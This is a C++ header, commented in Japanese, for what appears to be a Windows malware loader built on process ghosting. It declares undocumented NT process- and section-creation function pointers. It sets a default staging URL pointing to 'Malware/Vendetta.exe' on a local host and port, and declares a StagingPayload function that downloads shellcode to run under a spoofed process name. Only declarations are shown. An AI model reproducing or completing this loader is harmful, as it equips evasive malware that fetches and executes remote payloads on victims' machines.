#pragma once

#include <Windows.h>
#include <winternl.h>
#include <iostream>
#include <string>
#include <atlconv.h>
#include <UserEnv.h>
#include <wininet.h>
#include <vector>

#pragma comment(lib, "Ntdll.lib")
#pragma comment(lib, "Userenv.lib")
#pragma comment(lib, "wininet.lib")

typedef LONG KPRIORITY;
constexpr auto GDI_HANDLE_BUFFER_SIZE = 34;
constexpr auto RTL_USER_PROC_PARAMS_NORMALIZED = 0x00000001;

// 各関数ポインタ型の宣言
using pRtlCreateProcessParametersEx = NTSTATUS(WINAPI*)(PRTL_USER_PROCESS_PARAMETERS* pProcessParameters, PUNICODE_STRING ImagePathName, PUNICODE_STRING DllPath, PUNICODE_STRING CurrentDirectory, PUNICODE_STRING CommandLine, PVOID Environment, PUNICODE_STRING WindowTitle, PUNICODE_STRING DesktopInfo, PUNICODE_STRING ShellInfo, PUNICODE_STRING RuntimeData, ULONG Flags);
using pNtCreateProcessEx = NTSTATUS(WINAPI*)(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, HANDLE ParentProcess, ULONG Flags, HANDLE SectionHandle, HANDLE DebugPort, HANDLE ExceptionPort, BOOLEAN InJob);
using pNtCreateThreadEx = NTSTATUS(WINAPI*)(PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, HANDLE ProcessHandle, PVOID StartRoutine, PVOID Argument, ULONG CreateFlags, ULONG_PTR ZeroBits, SIZE_T StackSize, SIZE_T MaximumStackSize, PVOID AttributeList);
using pNtCreateSection = NTSTATUS(WINAPI*)(PHANDLE SectionHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PLARGE_INTEGER MaximumSize, ULONG SectionPageProtection, ULONG AllocationAttributes, HANDLE FileHandle);
using pNtSetInformationFile = NTSTATUS(WINAPI*)(HANDLE FileHandle, PIO_STATUS_BLOCK IoStatusBlock, PVOID FileInformation, ULONG Length, FILE_INFORMATION_CLASS FileInformationClass);

// 各関数ポインタの外部宣言
extern pNtCreateProcessEx NtCreateProcessEx;
extern pNtCreateThreadEx NtCreateThreadEx;
extern pNtCreateSection NtCreateSection;
extern pNtSetInformationFile NtSetInformationFile;
extern pRtlCreateProcessParametersEx RtlCreateProcessParametersEx;

struct Arg {
    // URLのパーツ
    wchar_t protocol[255] = L"http://";
    wchar_t ipAddress[255] = L"127.0.0.1";
    wchar_t port[255] = L"5555";
    wchar_t filePath[255] = L"Malware/Vendetta.exe";

    // ファイル名がプロセス名になる
    wchar_t fileName[255] = L"ProcessName";
};

std::wstring makeUrl(const Arg& arg);
bool StagingPayload(const std::wstring& url, std::vector<BYTE>& shellcode);
